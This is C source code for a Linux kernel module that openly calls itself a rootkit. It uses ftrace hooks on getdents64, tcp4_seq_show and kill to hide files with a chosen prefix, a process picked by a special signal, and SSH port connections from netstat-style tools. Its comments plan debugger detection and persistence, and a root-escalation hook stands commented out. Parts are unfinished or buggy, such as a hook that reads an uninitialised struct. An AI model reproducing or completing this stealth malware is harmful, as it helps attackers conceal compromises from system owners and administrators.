#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <net/sock.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>

#include "ftrace_helper.h"

/* file to hide */
#define PREFIX "wdb"

/* port to hide */
#define PORT 11111


char hidden_pid[32];


MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_tcpdiag_send)(int fd, int protocol,struct filter *f);
static asmlinkage int (*orig_kill)(const struct pt_regs *);
//hide network connections/ports(hide for ss now)
//hide processes(works for 1 process)
//gpu self healing
//debugger detection
//persistence

static asmlinkage int hook_kill(const struct pt_regs *regs){

	pid_t pid = regs->di;
	int sig=regs->si;

	if(sig==64){
		sprintf(hidden_pid, "%d%",pid);
		return 0;
			}
	else if(sig==63){
	//	set_root();
		return 0;
	}
	return orig_kill(regs);
}


/* hiding directory entries meaning files AND directories */
/* only have a 64 bit implementation because low on time */
asmlinkage int hook_getdents64(const struct pt_regs *regs){
	unsigned long offset=0;
	struct linux_dirent64 __user *dirent=(struct linux_dirent64*)regs->si;
	
	struct linux_dirent64 *dirent_ker,*current_dir,*previous_dir = NULL;

	int ret=orig_getdents64(regs);
	dirent_ker=kzalloc(ret,GFP_KERNEL);

	if((ret<=0)||(dirent_ker==NULL))
		return ret;

	long error;
	error=copy_from_user(dirent_ker,dirent,ret);
	if(error){
		printk(KERN_ERR "could not copy from user: %l bytes left",error);
		kfree(dirent_ker);
	}

	while(offset<ret){
		current_dir=(void *)dirent_ker+offset;

		if(memcmp(PREFIX,current_dir->d_name,strlen(PREFIX))==0 || (strncmp(hidden_pid,"",32)!=0 && memcmp(hidden_pid,current_dir->d_name,strlen(hidden_pid))==0)){
			if(current_dir==dirent_ker){
				ret-=current_dir->d_reclen;
				memmove(current_dir,(void *)current_dir+current_dir->d_reclen,ret);
				continue;
		}
			previous_dir->d_reclen+=current_dir->d_reclen;
		}

		else{
			previous_dir=current_dir;
		}

		offset+=current_dir->d_reclen;
	}
	error=copy_to_user(dirent,dirent_ker,ret);
	if(error){
		printk(KERN_ERR "could not copy to user: %l bytes left",error);
		kfree(dirent_ker);
	}


	kfree(dirent_ker);
	return ret;

}

/* hiding open ports. hook for netstat and other similar tools, not including ss */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
	struct sock *sk=v;

	if((sk!=0x1)&&(sk->sk_num==0x16))
			return 0;
	
	return orig_tcp4_seq_show(seq,v);
}


static asmlinkage int hook_tcpdiag_send(int fd, int protocol, struct filter *f){

	struct inet_diag_req r;
	if(memcmp(r.id.idiag_sport,htons(22),sizeof(r.id.idiag_sport))){
			printk(KERN_DEBUG "SHABADBADOOBEE");
			}

	return 0;
}



#else
#endif

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("tcp4_seq_show",hook_tcp4_seq_show,&orig_tcp4_seq_show),
	HOOK("__x64_sys_kill",hook_kill,&orig_kill),
};
static int __init basic_init(void){


	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO"rootkit loaded\n");

    return 0;
}

static void __exit basic_exit(void){
	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));

	printk(KERN_INFO"rootkit unloaded\n");
}


module_init(basic_init);
module_exit(basic_exit);
